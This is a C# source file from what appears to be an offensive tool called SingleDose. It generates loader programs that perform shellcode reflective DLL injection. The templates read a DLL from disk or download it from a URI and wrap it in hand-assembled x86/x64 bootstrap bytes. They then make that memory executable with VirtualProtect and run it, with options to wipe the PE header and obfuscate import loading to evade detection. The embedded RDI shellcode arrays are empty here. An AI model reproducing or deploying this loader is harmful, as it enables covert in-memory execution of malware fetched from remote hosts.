using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SingleDose
{
    class sRDI
    {
        public static string READFILE = @"
            byte[] dllContents = File.ReadAllBytes(@""{{FILEPATH}}"");
        ";

        public static string BYTES = @"
            System.Collections.Generic.List<byte> dllContentsList = new System.Collections.Generic.List<byte> { {{BYTES}} };
            byte[] dllContents = dllContentsList.ToArray();
";

        public static string STATICMODE = @"
            {{DLLCONTENTS}}

            uint functionHash = HashFunction(""{{FUNCTIONNAME}}"");
            byte[] userData = Encoding.Default.GetBytes(""{{USERDATA}}"");

            bool obfImports = {{OBFUSCATE}};
            int importDelay = {{IMPORTDELAY}};
            bool clearHeader = {{CLEARHEADER}};
            uint flags = 0;
            
            if (clearHeader) {
                flags = flags | 0x1;
            }
            if (obfImports)
            {
                double delay = importDelay * Math.Pow(2, 16);
                flags = ((flags | 0x4) | (uint) delay);
            }
";


        public static string DYNAMICMODE = @"
            if (args.Contains(""-h"",StringComparer.OrdinalIgnoreCase) || !args.Contains(""-dll"", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine(""\n -DLL: Path to dll. This is the only required flag for execution."");
                Console.WriteLine("" -Func: Function to call after DLLMain"");
                Console.WriteLine("" -Data: any additional data to pass to the targeted function. Must put data in quotes."");
                Console.WriteLine("" -ClearHeader: Clear the PE header on load."");
                Console.WriteLine("" -Obfuscate: Randomize the import dependency load order."");
                Console.WriteLine("" -Delay: Number of seconds to pause between loading each import. This requires -Obfuscate. Default value is 0."");
                Environment.Exit(0);
            }
            ArgValues parsedArgs = ArgParse(args);
            byte[] dllContents = File.ReadAllBytes(parsedArgs.DllPath);
            uint functionHash = HashFunction(parsedArgs.FunctionName);
            byte[] userData = Encoding.Default.GetBytes(parsedArgs.Data);
            bool obfImports = parsedArgs.ObfuscateImports;
            bool clearHeader = parsedArgs.ClearHeader;
            int importDelay = parsedArgs.ImportDelay; 
            uint flags = 0;
            if (clearHeader) {
                flags = flags | 0x1;
            }
            if (obfImports)
            {
                double delay = importDelay * Math.Pow(2, 16);
                flags = ((flags | 0x4) | (uint)delay);
            }
";
        public static string DYNAMICARGS = @"
        public class ArgValues {
            public string DllPath;
            public string FunctionName;
            public string Data;
            public bool ClearHeader;
            public bool ObfuscateImports;
            public int ImportDelay;
        };

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();
            if (arguments.Count() != 0)
            {
                for (var i = 0; i<arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-DLL"") && arguments[i + 1] != null)
                    {
                        if (File.Exists(arguments[i + 1]))
                        {
                            collection.DllPath = arguments[i + 1];
                        }
                        else if (!File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid DLL path supplied."");
                            return null;
                        }
                    }
                    if (arguments[i].ToUpper() == ""-FUNC"" && arguments[i + 1] != null)
                    {
                        collection.FunctionName = arguments[i + 1];
                    }
                    if (arguments[i].ToUpper().StartsWith(""-DATA"") && arguments[i + 1] != null) 
                    {
                        collection.Data = arguments[i + 1];
                    }
                    if (arguments[i].ToUpper().StartsWith(""-CLEARHEADER""))
                    {
                        collection.ClearHeader = true;
                    }
                    if (arguments[i].ToUpper().StartsWith(""-OBFUSCATE""))
                    {
                        collection.ObfuscateImports = true;
                    }
                    int tryParse;
                    if (arguments[i].ToUpper().StartsWith(""-DELAY"") && int.TryParse(arguments[i + 1], out tryParse))
                    {
                        collection.ImportDelay = tryParse;
                    }
                }
                if (!arguments.Contains(""-func"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.FunctionName = ""0"";
                }
                if (!arguments.Contains(""-data"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.Data = """";
                }
                if (!arguments.Contains(""-clearheader"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.ClearHeader = false;
                }
                if (!arguments.Contains(""-obfuscate"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.ObfuscateImports = false;
                }
                if (!arguments.Contains(""-delay"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.ImportDelay = 0;
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }
            return collection;
        }
    ";

        public static string DOWNLOADMODE = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine(""\n - URI: URI of dll download.This is the only required flag for execution."") ;
                Console.WriteLine("" - Func: Function to call after DLLMain"");
                Console.WriteLine("" - Data: any additional data to pass to the targeted function.Must put data in quotes."");
                Console.WriteLine("" - ClearHeader: Clear the PE header on load."");
                Console.WriteLine("" - Obfuscate: Randomize the import dependency load order."");
                Console.WriteLine("" - Delay: Number of seconds to pause between loading each import.This requires - Obfuscate.Default value is 0."");
                Environment.Exit(0);
            }
            ArgValues parsedArgs = ArgParse(args);
            System.Net.WebClient wc = new System.Net.WebClient();
            byte[] dllContents = wc.DownloadData(parsedArgs.URI);
            uint functionHash = HashFunction(parsedArgs.FunctionName);
            byte[] userData = Encoding.Default.GetBytes(parsedArgs.Data);

            bool obfImports = parsedArgs.ObfuscateImports;
            bool clearHeader = parsedArgs.ClearHeader;
            int importDelay = parsedArgs.ImportDelay;
            uint flags = 0;
            if (clearHeader) {
                flags = flags | 0x1;
            }

            if (obfImports)
            {
                double delay = importDelay * Math.Pow(2, 16);
                flags = ((flags | 0x4) | (uint)delay);
            }
";

        public static string DOWNLOADARGS = @"
        public class ArgValues {
            public string URI;
            public string FunctionName;
            public string Data;
            public bool ClearHeader;
            public bool ObfuscateImports;
            public int ImportDelay;
        };

        static ArgValues ArgParse(string[] arguments)
        {

            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        collection.URI = arguments[i + 1];
                    }
                    if (arguments[i].ToUpper() == ""-FUNC"" && arguments[i + 1] != null)
                    {
                        collection.FunctionName = arguments[i + 1];
                    }
                    if (arguments[i].ToUpper().StartsWith(""-DATA"") && arguments[i + 1] != null)
                    {
                        collection.Data = arguments[i + 1];
                    }
                    if (arguments[i].ToUpper().StartsWith(""-CLEARHEADER""))
                    {
                        collection.ClearHeader = true;
                    }
                    if (arguments[i].ToUpper().StartsWith(""-OBFUSCATE""))
                    {
                        collection.ObfuscateImports = true;
                    }
                    int tryParse;
                    if (arguments[i].ToUpper().StartsWith(""-DELAY"") && int.TryParse(arguments[i + 1], out tryParse))
                    {
                        collection.ImportDelay = tryParse;
                    }
                }

                if (!arguments.Contains(""-func"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.FunctionName = ""0"";
                }
                if (!arguments.Contains(""-data"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.Data = """";
                }
                if (!arguments.Contains(""-clearheader"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.ClearHeader = false;
                }
                if (!arguments.Contains(""-obfuscate"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.ObfuscateImports = false;
                }
                if (!arguments.Contains(""-delay"", StringComparer.OrdinalIgnoreCase))
                {
                    collection.ImportDelay = 0;
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
                Environment.Exit(0);
            }
            return collection;
        }
";

        public static string BODY = @"
using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace {{NAMESPACE}}
{
    partial class Program
    {
        
        private delegate IntPtr SC();

        static void Main(string[] args)
        {
            {{TRIGGER}}
            {{MODE}}

            byte[] payload = ConvertToSC(dllContents, functionHash, userData, flags);
            GCHandle SCHandle = GCHandle.Alloc(payload, GCHandleType.Pinned);
            IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
            uint flOldProtect;

            if (VirtualProtect(SCPointer, (UIntPtr)payload.Length, 0x40, out flOldProtect))
            {
                SC executesc = (SC)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(SC));
                executesc();
            }
        }
        {{ARGS}}
        static uint Ror(uint val, int r_bits, int max_bits)
        {
            return (val >> r_bits) | (val << (max_bits - r_bits));
        }
        public static uint HashFunction(string name)
        {
            uint functionHash = 0;
            name += ""\x00"";
            foreach (char c in name)
            {
                functionHash = Ror(functionHash, 13, 32);
                functionHash += c;
            }
            return functionHash;
        }
        static unsafe bool Is64BitDLL(byte[] dllBytes)
        {
            bool is64Bit = false;
            GCHandle scHandle = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
            IntPtr scPointer = scHandle.AddrOfPinnedObject();
            Int32 headerOffset = Marshal.ReadInt32(scPointer, 60);
            UInt16 magic = (UInt16)Marshal.ReadInt16(scPointer, headerOffset + 4);
            if (magic == (UInt16)512 || magic == (UInt16)34404)
                is64Bit = true;
            scHandle.Free();
            return is64Bit;
        }
        public static byte[] Combine(byte[] first, byte[] second)
        {
            byte[] bytes = new byte[first.Length + second.Length];
            Buffer.BlockCopy(first, 0, bytes, 0, first.Length);
            Buffer.BlockCopy(second, 0, bytes, first.Length, second.Length);
            return bytes;
        }

        public static byte[] ConvertToSC(byte[] dllBytes, uint functionHash, byte[] userData, uint flags)
        {
            var rdiShellcode32 = new byte[] {  };
            var rdiShellcode64 = new byte[] {  };
            byte[] newShellcode = new byte[] { };
            uint dllOffset = 0;
            
            if (Is64BitDLL(dllBytes))
            {
                var rdiShellcode = rdiShellcode64;
                int bootstrapSize = 64;

                // call next instruction (Pushes next instruction address to stack)
                newShellcode = Combine(newShellcode, new byte[] { 0xe8, 0x00, 0x00, 0x00, 0x00 });
                // Set the offset to our DLL from pop result
                dllOffset = (uint)(bootstrapSize - newShellcode.Length + rdiShellcode.Length);
                // pop rcx - Capture our current location in memory
                newShellcode = Combine(newShellcode, new byte[] { 0x59 });
                // mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
                newShellcode = Combine(newShellcode, new byte[] { 0x49,0x89,0xc8});
                // Setup the location of the DLL into RCX
                // add rcx, <Offset of the DLL>
                newShellcode = Combine(newShellcode, new byte[] { 0x48,0x81,0xc1});

                foreach (byte b in BitConverter.GetBytes(dllOffset))
                {
                    //newShellcode.Add(b);
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // mov edx, <Hash of function>
                newShellcode = Combine(newShellcode, new byte[] { 0xba});
                foreach (byte b in BitConverter.GetBytes(functionHash))
                {
                    //newShellcode.Add(b);
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // Put the location of our user data in 
                // add r8, <Offset of the DLL> + <Length of DLL>
                newShellcode = Combine(newShellcode, new byte[] { 0x49,0x81,0xc0});
                foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                {
                    //newShellcode.Add(b);
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // mov r9d, <Length of User Data>
                newShellcode = Combine(newShellcode, new byte[] { 0x41,0xb9 });
                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // push rsi - save original value
                newShellcode = Combine(newShellcode, new byte[] { 0x56 });
                // mov rsi, rsp - store our current stack pointer for later
                newShellcode = Combine(newShellcode, new byte[] { 0x48,0x89,0xe6 });
                // and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
                newShellcode = Combine(newShellcode, new byte[] { 0x48,0x83,0xe4,0xf0 });
                // sub rsp, 0x30 - Create some breathing room on the stack 
                // 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment
                // mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
                newShellcode = Combine(newShellcode, new byte[] { 0x48,0x83,0xec,6*8,0xc7,0x44,0x24,4*8});

                foreach (byte b in BitConverter.GetBytes((uint)flags))
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // call - Transfer execution to the RDI
                newShellcode = Combine(newShellcode, new byte[] {0xe8,(byte)(bootstrapSize - newShellcode.Length - 4), 0x00,0x00,0x00});
                // mov rsp, rsi - Reset our original stack pointer
                newShellcode = Combine(newShellcode, new byte[] { 0x48,0x89,0xf4});
                // pop rsi - Put things back where we left them
                newShellcode = Combine(newShellcode, new byte[] { 0x5e });
                // ret - return to caller
                newShellcode = Combine(newShellcode, new byte[] { 0xc3 });
                // Write the rest of RDI
                foreach (byte b in rdiShellcode)
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // Write our DLL
                foreach (byte b in dllBytes)
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // Write our userdata
                foreach (byte b in userData)
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
            }
            else // 32 Bit
            {
                var rdiShellcode = rdiShellcode32;
                int bootstrapSize = 49;
                // call next instruction (Pushes next instruction address to stack)
                newShellcode = Combine(newShellcode, new byte[] { 0xe8, 0x00, 0x00, 0x00, 0x00 });

                // Set the offset to our DLL from pop result
                dllOffset = (uint)(bootstrapSize - newShellcode.Length + rdiShellcode.Length);
                // pop eax - Capture our current location in memory
                newShellcode = Combine(newShellcode, new byte[] { 0x58 });
                // push ebp
                newShellcode = Combine(newShellcode, new byte[] { 0x55 });
                // mov ebp, esp
                newShellcode = Combine(newShellcode, new byte[] { 0x89, 0xe5 });
                // mov edx, eax - copy our location in memory to ebx before we start modifying eax
                newShellcode = Combine(newShellcode, new byte[] { 0x89,0xc2 });
                // add eax, <Offset to the DLL>
                newShellcode = Combine(newShellcode, new byte[] { 0x05 });
                foreach (byte b in BitConverter.GetBytes(dllOffset))
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // add edx, <Offset to the DLL> + <Size of DLL>
                newShellcode = Combine(newShellcode, new byte[] { 0x81,0xc2 });
                foreach (byte b in BitConverter.GetBytes((uint)(dllOffset + dllBytes.Length)))
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // push <Flags>
                newShellcode = Combine(newShellcode, new byte[] { 0x68 });
                foreach (byte b in BitConverter.GetBytes(flags))
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // push <Length of User Data>
                newShellcode = Combine(newShellcode, new byte[] { 0x68 });
                foreach (byte b in BitConverter.GetBytes((uint)userData.Length))
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                    
                // push edx
                newShellcode = Combine(newShellcode, new byte[] { 0x52 });
                // push <hash of function>
                newShellcode = Combine(newShellcode, new byte[] { 0x68 });
                foreach (byte b in BitConverter.GetBytes(functionHash))
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                // push eax
                newShellcode = Combine(newShellcode, new byte[] { 0x50 });
                // call - Transfer execution to the RDI
                newShellcode = Combine(newShellcode, new byte[] { 0xe8,(byte)(bootstrapSize - newShellcode.Length - 4), 0x00, 0x00, 0x00});
                // add esp, 0x14
                newShellcode = Combine(newShellcode, new byte[] { 0x83,0xc4,0x14 });
                // leave
                newShellcode = Combine(newShellcode, new byte[] { 0xc9 });
                // ret - return to caller
                newShellcode = Combine(newShellcode, new byte[] { 0xc3 });
                //Write the rest of RDI
                foreach (byte b in rdiShellcode)
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                //Write our DLL
                dllBytes[0] = 0x00;
                dllBytes[1] = 0x00;
                foreach (byte b in dllBytes)
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
                //Write our userdata
                foreach (byte b in userData)
                {
                    newShellcode = Combine(newShellcode, new byte[] { b });
                }
            }
            return newShellcode;
        }

        [DllImport(""kernel32.dll"")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
    }
}";


    }
}
